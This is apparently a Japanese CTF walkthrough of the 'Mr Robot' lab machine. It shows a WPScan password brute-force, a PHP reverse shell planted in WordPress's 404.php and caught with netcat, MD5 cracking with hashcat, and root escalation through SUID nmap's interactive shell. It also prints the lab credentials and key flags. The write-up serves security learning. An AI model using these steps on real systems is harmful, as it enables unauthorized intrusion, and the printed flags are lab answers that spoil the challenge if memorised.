key1について

robots.txtにファイル確認

key2について

まずはwordpressにログイン試行

key1とともに見つけたfsocity.dicが辞書ファイル(wordlist)であることを確認

元ネタの映画から"Elliot"というユーザでログイン試行

wpscan --url http://10.10.90.142/wp-login --passwords sorted_fsocity.dic --usernames elliot | tee wpscan-elliot

_______________________________________________________________

__          _______   _____

\ \        / /  __ \ / ____|

\ \  /\  / /| |__) | (___   ___  __ _ _ __ ®

\ \/  \/ / |  ___/ \___ \ / __|/ _\` | '_ \

\  /\  /  | |     ____) | (__| (_| | | | |

\/  \/   |_|    |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team

Version 3.8.25

@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

_______________________________________________________________

\[i\] Updating the Database ...

\[i\] Update completed.

\[+\] URL: http://10.10.90.142/wp-login/ \[10.10.90.142\]

\[+\] Started: Wed Feb  7 21:58:47 2024

Interesting Finding(s):

\[+\] Headers

\| Interesting Entries:

\|  - Server: Apache

\|  - X-Powered-By: PHP/5.5.29

\|  - X-Mod-Pagespeed: 1.9.32.3-4523

\| Found By: Headers (Passive Detection)

\| Confidence: 100%

\[+\] WordPress readme found: http://10.10.90.142/wp-login/readme.html

\| Found By: Direct Access (Aggressive Detection)

\| Confidence: 100%

\[+\] This site seems to be a multisite

\| Found By: Direct Access (Aggressive Detection)

\| Confidence: 100%

\| Reference: http://codex.wordpress.org/Glossary#Multisite

\[+\] The external WP-Cron seems to be enabled: http://10.10.90.142/wp-login/wp-cron.php

\| Found By: Direct Access (Aggressive Detection)

\| Confidence: 60%

\| References:

\|  - https://www.iplocation.net/defend-wordpress-from-ddos

\|  - https://github.com/wpscanteam/wpscan/issues/1299

\[+\] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).

\| Found By: Query Parameter In Install Page (Aggressive Detection)

\|  - http://10.10.90.142/wp-includes/css/buttons.min.css?ver=4.3.1

\|  - http://10.10.90.142/wp-includes/css/dashicons.min.css?ver=4.3.1

\| Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)

\|  - http://10.10.90.142/wp-includes/css/buttons.min.css?ver=4.3.1

\|  - http://10.10.90.142/wp-includes/css/dashicons.min.css?ver=4.3.1

\[i\] The main theme could not be detected.

\[+\] Enumerating All Plugins (via Passive Methods)

\[i\] No plugins Found.

\[+\] Enumerating Config Backups (via Passive and Aggressive Methods)

Checking Config Backups -: |============================================================================================|

\[i\] No Config Backups Found.

\[+\] Performing password attack on Wp Login against 1 user/s

Progress: |=====================================================

\[SUCCESS\] - elliot / ER28-0652

Progress: |===================================

\[!\] Valid Combinations Found:

\| Username: elliot, Password: ER28-0652

\[!\] No WPScan API Token given, as a result vulnerability data has not been output.

\[!\] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

\[+\] Finished: Wed Feb  7 22:17:53 2024

\[+\] Requests Done: 5966

\[+\] Cached Requests: 4

\[+\] Data Sent: 2.01 MB

\[+\] Data Received: 43.457 MB

\[+\] Memory used: 273.742 MB

\[+\] Elapsed time: 00:19:06

パスワードゲット　ER28-0652

wordpressの404.php機能を使ってphp-reverse-shellを作成（pentestmonkeyを利用)

![[Mr Robot CTF image.png]]

nc -lnvp 1234で待ち受け開始

http://10.10.90.142/wp-admin/404.php　へアクセス

nc -lnvp 1234

listening on \[any\] 1234 ...

connect to \[10.18.31.142\] from (UNKNOWN) \[10.10.90.142\] 35619

Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

13:47:53 up  2:11,  0 users,  load average: 0.00, 0.01, 0.05

USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

uid=1(daemon) gid=1(daemon) groups=1(daemon)

/bin/sh: 0: can't access tty; job control turned off

$ cd /home/robot

$ ls

key-2-of-3.txt

password.raw-md5

$ cat password.raw-md5

robot:c3fcd3d76192e4007dfb496cca67e13b

hashcat -m 0 -a 0 c3fcd3d76192e4007dfb496cca67e13b /home/kali/rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 \[The pocl project\]

\==================================================================================================================================================

\* Device #1: cpu-haswell-Intel(R) Core(TM) i5-8350U CPU @ 1.70GHz, 1437/2938 MB (512 MB allocatable), 6MCU

Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1

Optimizers applied:

\* Zero-Byte

\* Early-Skip

\* Not-Salted

\* Not-Iterated

\* Single-Hash

\* Single-Salt

\* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:

\* Filename..: /home/kali/rockyou.txt

\* Passwords.: 14344392

\* Bytes.....: 139921507

\* Keyspace..: 14344385

\* Runtime...: 10 secs

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 0 (MD5)

Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b

Time.Started.....: Wed Feb  7 22:53:48 2024 (2 secs)

Time.Estimated...: Wed Feb  7 22:53:50 2024 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (/home/kali/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:    35539 H/s (0.48ms) @ Accel:256 Loops:1 Thr:1 Vec:8

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 41472/14344385 (0.29%)

Rejected.........: 0/41472 (0.00%)

Restore.Point....: 39936/14344385 (0.28%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: promo2007 -> 180993

Started: Wed Feb  7 22:51:43 2024

Stopped: Wed Feb  7 22:53:56 2024

$ find / -type f -perm -4000 -ls 2>/dev/null

15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping

15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount

15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount

15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6

15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su

36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd

36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp

36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh

36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn

36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd

36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo

34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap

38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign

38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device

395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper

395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown

$ su robot

su: must be run from a terminal

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

daemon@linux:/home/robot$ su robot

su robot

Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ ls

ls

key-2-of-3.txt  password.raw-md5

robot@linux:~$ cat key-2-of-3.txt

cat key-2-of-3.txt

822c73956184f694993bede3eb39f959

key3について

robot@linux:~$ /usr/local/bin/nmap --interactive

/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )

Welcome to Interactive Mode -- press h \<enter> for help

nmap> !sh

!sh

\# whoami

whoami

root

\# ls /root

ls /root

firstboot_done  key-3-of-3.txt

\# cat key-3-of-3.txt

cat key-3-of-3.txt

cat: key-3-of-3.txt: No such file or directory

\# cat /root/key-3-of-3.txt

cat /root/key-3-of-3.txt

04787ddef27c3dee1ee161b21670b4e4

\#